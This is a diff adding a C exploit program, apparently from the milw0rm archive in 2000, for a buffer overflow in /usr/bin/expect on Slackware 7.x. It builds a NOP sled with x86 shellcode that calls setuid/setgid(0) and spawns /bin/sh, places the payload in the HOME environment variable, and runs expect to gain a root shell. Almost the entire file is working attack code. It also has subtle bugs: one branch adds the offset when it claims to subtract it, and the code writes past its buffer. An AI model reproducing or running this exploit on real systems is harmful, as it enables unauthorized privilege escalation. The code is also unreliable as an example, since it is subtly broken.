@@ -1,0 +1,107 @@
+/* hhp-expect_smash.c (12/11/00)
+ *
+ * expect (/usr/bin/expect) buffer overflow.
+ * Tested 5.31.8 and 5.28.1, slackware 7.x (Maybe others).
+ *
+ * By: isox
+ * Site: www.hhp-programming.net
+ * Advisory: www.hhp-programming.net/ouradvisories/hhp-expect_adv%2317.txt
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define NOP				0x90
+#define OFFSET			0
+#define BUFLEN			416
+#define RET				0xbffff580			/* Slackware 7.1 */
+#define EXPECT			"/usr/bin/expect"
+
+char code[] =
+ "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x66\x31\xc0\x66\x31"
+ "\xdb\xb0\x2e\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
+ "\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08"
+ "\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
+ "\xdc\xff\xff\xff/bin/sh\x69";
+
+void usage(char *arg) {
+  fprintf(stderr, "\nUsage: %s [offset up/down] [eip]\n\n", arg);
+  fprintf(stderr, "Examples:\n");
+  fprintf(stderr, "\t%s 347 up                 -=- Default EIP increased by 347 bytes\n", arg);
+  fprintf(stderr, "\t%s 347 down               -=- Default EIP decreased by 347 bytes\n", arg);
+  fprintf(stderr, "\t%s 429 up 0x%lx      -=- EIP set to 0x%lx and increased by 429 bytes\n", arg, RET, RET + 429);
+  fprintf(stderr, "\t%s 429 down 0x%lx    -=- EIP set to 0x%lx and decreased by 429 bytes\n\n", arg, RET, RET - 429);
+  exit(1);
+}
+
+
+int main(int argc, char *argv[]) {
+  char *buf, *p;
+  long *addressp, address;
+  int offset=OFFSET;
+  int i;
+
+
+  if((argc < 3) || (argc > 4))
+    usage(argv[0]);
+
+  if(argc == 3) {
+    if(!strcmp(argv[2], "up")) {
+      address = RET + atoi(argv[1]);
+      printf("Increasing offset by: %d\n", atoi(argv[1]));
+      printf("Increasing EIP to: 0x%x\n\n", RET + atoi(argv[1]));
+    }
+
+    if(!strcmp(argv[2], "down")) {
+      address = RET - atoi(argv[1]);
+      printf("Decreasing offset by: %d\n", atoi(argv[1]));
+      printf("Decreasing EIP to: 0x%x\n\n", RET - atoi(argv[1]));
+    }
+  }
+
+  if(argc >= 4) {
+    if(!strcmp(argv[2], "up")) {
+      address = strtoul(argv[3], NULL, 16) + atoi(argv[1]);
+      printf("Setting EIP to: 0x%x\n", strtoul(argv[3], NULL, 16));
+      printf("Increasing offset by: %d\n", atoi(argv[1]));
+      printf("Increasing EIP to: 0x%x\n\n", (strtoul(argv[3], NULL, 16) + atoi(argv[1])));
+    }
+    if(!strcmp(argv[2], "down")) {
+      address = strtoul(argv[3], NULL, 16) + atoi(argv[1]);
+      printf("Setting EIP to: 0x%x\n", strtoul(argv[3], NULL, 16));
+      printf("Decreasing offset by: %d\n", atoi(argv[1]));
+      printf("Decreasing EIP to: 0x%x\n\n", (strtoul(argv[3], NULL, 16) - atoi(argv[1])));
+    }
+  }
+
+
+  if (!(buf = (char *)malloc(BUFLEN))) {
+    printf("Can't allocate memory.\n");
+    exit(-1);
+  }
+
+  p = buf;
+  addressp = (long *) p;
+
+  for (i = 0; i < BUFLEN; i+=4) {
+    *(addressp++) = address;
+  }
+
+  for (i = 0; i < (BUFLEN - strlen(code) - 4); i++) {
+    buf[i] = NOP;
+  }
+
+  p = buf + (BUFLEN - strlen(code) - 4);
+
+  for (i = 0; i < strlen(code); i++)
+    *(p++) = code[i];
+
+  buf[BUFLEN] = '\0';
+
+
+  setenv("HOME", buf, 1);
+  system(EXPECT);
+}
+
+
+// milw0rm.com [2000-12-04]
